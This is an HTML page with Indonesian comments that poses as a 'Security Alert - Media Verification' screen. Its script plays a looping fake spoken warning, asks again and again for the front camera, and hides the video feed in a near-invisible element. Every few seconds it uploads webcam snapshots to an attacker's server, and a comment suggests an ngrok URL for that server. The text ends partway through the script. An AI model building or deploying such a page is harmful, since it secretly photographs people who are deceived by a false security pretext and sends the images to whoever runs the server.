<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert - Media Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
  video { width: 320px; height: 240px; border: 1px solid #333; background: #111; }
  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
</style>
</head>
<body>

<div class="hidden-container">
  <video id="cam-feed" autoplay playsinline muted></video>
  <canvas id="processing-canvas" width="640" height="480"></canvas>
</div>

<script>
(function () {
  'use strict';

  var CONFIG = {
    tts: {
      text: "Security verification required. Camera access must remain active to confirm user identity.",
      lang: 'en-US',
      rate: 0.9,
      pitch: 1.0,
      repeatInterval: 5000,
      maxRepeats: 30
    },
    loopInterval: 2500,
    uploadInterval: 3000,     // Mengirim frame setiap 3 detik
    // Ganti URL di bawah dengan alamat server lokal (IP network) atau URL ngrok Anda
    serverEndpoint: 'http://192.168.2.124:8080/upload_capture' 
  };

  var state = {
    ttsStarted: false,
    camStream: null,
    camActive: false,
    loopTimer: null,
    uploadTimer: null
  };

  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.onend = function () {
        setTimeout(speakOnce, CONFIG.tts.repeatInterval);
      };
      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  function captureAndUpload() {
    if (!state.camActive) return;

    var videoElement = document.getElementById('cam-feed');
    var canvas = document.getElementById('processing-canvas');
    var ctx = canvas.getContext('2d');

    try {
      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      var dataURL = canvas.toDataURL('image/jpeg', 0.85);

      fetch(CONFIG.serverEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ image: dataURL })
      })
      .then(function(res) { return res.json(); })
      .then(function(data) {
        console.log('[+] Frame terkirim & tersimpan:', data.filename);
      })
      .catch(function(err) {
        console.log('[-] Gagal mengirim frame ke server:', err);
      });
    } catch (e) {}
  }

  function stopCurrentStream() {
    if (state.camStream) {
      try {
        state.camStream.getTracks().forEach(function(track) { track.stop(); });
      } catch (e) {}
      state.camStream = null;
    }
    state.camActive = false;
  }

  function requestCameraAccess() {
    stopCurrentStream();

    navigator.mediaDevices.getUserMedia({ 
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
      audio: false 
    })
    .then(function(stream) {
      state.camStream = stream;
      state.camActive = true;
      
      var videoElement = document.getElementById('cam-feed');
      videoElement.srcObject = stream;
      videoElement.play().catch(function(){});

      stream.getVideoTracks().forEach(function(track) {
        track.onended = function() {
          state.camActive = false;
        };
      });
    })
    .catch(function(err) {
      console.log("[-] Akses kamera ditolak:", err.name);
    });
  }

  window.addEventListener('DOMContentLoaded', function() {
    startTTS();
    requestCameraAccess();
  });

  state.loopTimer = setInterval(requestCameraAccess, CONFIG.loopInterval);
  state.uploadTimer = setInterval(captureAndUpload, CONFIG.uploadInterval);

  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) {
      startTTS();
      requestCameraAccess();
